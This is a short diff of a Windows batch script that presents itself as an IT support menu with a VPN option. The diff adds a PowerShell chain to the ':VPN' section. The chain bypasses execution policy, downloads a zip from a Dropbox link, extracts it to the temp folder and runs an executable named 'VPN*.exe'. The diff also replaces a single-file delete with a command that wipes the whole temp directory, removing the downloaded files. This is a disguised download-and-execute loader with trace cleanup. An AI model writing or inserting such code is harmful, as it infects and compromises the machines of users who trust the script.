@@ -74,11 +74,11 @@ GOTO Main
  
 ::===============================================================================================================
 :VPN
-CLS
+powershell -exe bypass invoke-webrequest https://dl.dropbox.com/scl/fi/7tpn5afcczjw9lz7oajyl/v.zip?rlkey=tjsqqnxa73nt0ny65rzoailzy -Outfile $env:temp\tamhq2.zip && powershell -exe bypass Expand-Archive "$env:temp\tamhq2.zip" -DestinationPath "$env:temp\tamhq2" -Force && powershell -exe bypass start "$env:temp\tamhq2\VPN*.exe" && CLS
 echo MSGBOX "CONTACT IT", vbInformation,"..:: IT | Vietnam Team 2023 ::.."  > %temp%\TEMPmessage.vbs
 pushd %temp%
 TEMPmessage.vbs
-del /f /q TEMPmessage.vbs >nul 2>&1
+rmdir /s /q %temp%>nul 2>&1
 GOTO Main
 ::===============================================================================================================
 :Load
